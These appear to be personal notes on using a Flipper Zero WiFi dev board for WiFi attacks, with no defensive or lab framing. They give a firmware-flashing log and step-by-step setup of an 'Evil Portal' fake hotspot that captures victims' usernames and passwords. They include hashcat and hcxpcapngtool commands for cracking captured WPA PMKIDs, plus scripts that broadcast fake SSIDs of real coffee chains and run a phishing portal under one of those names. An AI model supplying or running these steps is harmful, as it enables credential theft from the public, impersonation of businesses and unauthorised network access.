## Wifi dev board
- Flash Marauder into the Wifi Dev Board
    - Easiest: https://github.com/SkeletonMan03/FZEasyMarauderFlash
    - Oudated: https://github.com/UberGuidoZ/Flipper/tree/main/Wifi_DevBoard/FZ_Marauder_Flasher
- References:
    - ESP32Marauder: https://github.com/justcallmekoko/ESP32Marauder/wiki

```
//==================================================================\\
|| Options:						            ||
||  1) Flash Marauder on WiFi Devboard or ESP32-S2	            ||
||  2) Save Flipper Blackmagic WiFi settings		            ||
||  3) Flash Flipper Blackmagic				            ||
||  4) Flash Marauder on ESP32-WROOM			            ||
||  5) Flash Marauder on ESP32 Marauder Mini		            ||
||  6) Flash v6 Marauder on ESP32-WROOM (RabbitLabs Minion Marauder)||
||  7) Flash Marauder on ESP32-S3			            ||
||  8) Flash Marauder on AWOK v1-3 or Duoboard                      ||
||  9) Flash Marauder on AWOK v4 Chungus Board                      ||
|| 10) Flash Marauder on AWOK v5 ESP32                              ||
|| 11) Flash Marauder on AWOK Dual ESP32 (Orange Port)              ||
|| 12) Flash Marauder on AWOK Dual ESP32 Touch Screen (White Port)  ||
|| 13) Flash Marauder on AWOK Dual ESP32 Mini (White Port)          ||
|| 14) Flash Evil Portal on ESP32-WROOM				    ||
|| 15) Flash Evil Portal on ESP32-S2 or WiFi Devboard		    ||
|| 16) Just Erase ESP32 - Try this if you think you bricked it	    ||
|| 17) Update all files					            ||
|| 18) Exit						            ||
\\==================================================================//

Please enter the number of your choice: 1
You have chosen to flash Marauder on a WiFi devboard or ESP32-S2
Checking for serial port...
You are most likely using a Flipper Zero WiFi Devboard or an ESP32-S2
Erasing firmware...
esptool.py v4.8.1
Serial port /dev/cu.usbmodem01
Connecting...
Detecting chip type... Unsupported detection protocol, switching and trying again...
Detecting chip type... ESP32-S2
Chip is ESP32-S2 (revision v0.0)
Features: WiFi, No Embedded Flash, No Embedded PSRAM, ADC and temperature sensor calibration in BLK2 of efuse V2
Crystal is 40MHz
MAC: a0:76:4e:9e:7f:d2
Uploading stub...
Running stub...
Stub running...
Erasing flash (this may take a while)...
Chip erase completed successfully in 14.5s
Staying in bootloader.
Successfully erased!
Waiting 5 seconds...
Flashing Marauder on ESP32-S2
esptool.py v4.8.1
Serial port /dev/cu.usbmodem01
Connecting...
Chip is ESP32-S2 (revision v0.0)
Features: WiFi, No Embedded Flash, No Embedded PSRAM, ADC and temperature sensor calibration in BLK2 of efuse V2
Crystal is 40MHz
MAC: a0:76:4e:9e:7f:d2
Uploading stub...
Running stub...
Stub running...
Configuring flash size...
Flash will be erased from 0x00001000 to 0x00004fff...
Flash will be erased from 0x00008000 to 0x00008fff...
Flash will be erased from 0x00010000 to 0x000fdfff...
SHA digest in image updated
Compressed 13648 bytes to 9382...
Wrote 13648 bytes (9382 compressed) at 0x00001000 in 0.2 seconds (effective 677.2 kbit/s)...
Hash of data verified.
Compressed 3072 bytes to 129...
Wrote 3072 bytes (129 compressed) at 0x00008000 in 0.0 seconds (effective 625.5 kbit/s)...
Hash of data verified.
Compressed 972624 bytes to 609591...
Wrote 972624 bytes (609591 compressed) at 0x00010000 in 6.6 seconds (effective 1187.3 kbit/s)...
Hash of data verified.

Leaving...
Staying in bootloader.
ESP32-S2 has been flashed with Marauder
```

- Wifi Evil Portal: https://github.com/bigbrodude6119/flipper-zero-evil-portal/tree/main/flipper/apps_data/evil_portal
    - Copy `index.html` into `SD Card/apps_data/marauder/html`
    - Go to Apps -> GPIO ->[ESP32] Wifi Marauder-> SSID -> Select "add name" (to add an SSID for example "Free Wifi") and save
    - Next go to List -> Select "ssid" and find number associated with the ssid you created ->Go to Select and change to "ssid" and enter the number associated with the ssid this number should be "0" at this point and save.
    - Now go to "Load Evil Portal HTML file" and choose `index.html`
    - Go to Evil Portal and start. At this point the IP address of your portal should be displayed. Connect a device to the free google wifi and enter Username and Password and it should display on your Flipper.

- Flipper Zero Demo: WiFi Marauder, Wireshark and Hashcat: https://www.youtube.com/watch?v=F5iiwounbzY
    - Flipper scan AP > List > Select AP > Sniff pmkid -> Download pcap file -> convert to hashcat format -> crack
    ```
    # https://hashcat.net/cap2hashcat/ or hcxpcapngtool
    hcxpcapngtool -o out.hc22000 -E essidlist sniffpmkid.pcap
    wget https://wpa-sec.stanev.org/dict/cracked.txt.gz
    hashcat -m 22000 -d 5 out.hc22000 cracked.txt.gz

    hashcat -m 22000 -a 3 out.hc22000 "?d?d?d?d?d?d?d?d"
    ```
- Wordlists:
    - https://github.com/richiemann/vietnam-password-lists
    - https://github.com/danielmiessler/SecLists/tree/master/Passwords/WiFi-WPA
---

### Scripts
- EvilPortal.json
```
{
	"meta":	{
		"description":	"EvilPortal",
		"enableLed":	true,
		"repeat":	1.0000000000000000
	},
	"stages":	[{
			"exec":	{
				"command":	"clearlist -s"
			}
		}, {
			"exec":	{
				"command":	"ssid -a -n 'HighLand Coffee'"
			}
		}, {
			"exec":	{
				"command":	"evilportal -c start"
			}
		}]
}
```
- SpamSSIDList.json

```
{
	"meta": {
		"description": "SpamSSIDList",
		"enableLed": true,
		"repeat": 1.0000000000000000
	},
	"stages": [
		{
			"exec": {
				"command": "clearlist -s"
			}
		},
		{
			"exec": {
				"command": "ssid -a -n 5G_Free"
			}
		},
		{
			"exec": {
				"command": "ssid -a -n Free"
			}
		},
		{
			"exec": {
				"command": "ssid -a -n 'HighLand Coffee'"
			}
		},
		{
			"exec": {
				"command": "ssid -a -n 'Trung Nguyen Coffee'"
			}
		},
		{
			"exec": {
				"command": "ssid -a -n 'Starbucks Coffee'"
			}
		},
		{
			"exec": {
				"command": "ssid -a -n 'Phuc Long Coffee'"
			}
		},
		{
			"exec": {
				"command": "list -s"
			}
		},
		{
			"exec": {
				"command": "attack -t beacon -l"
			}
		}
	]
}

```
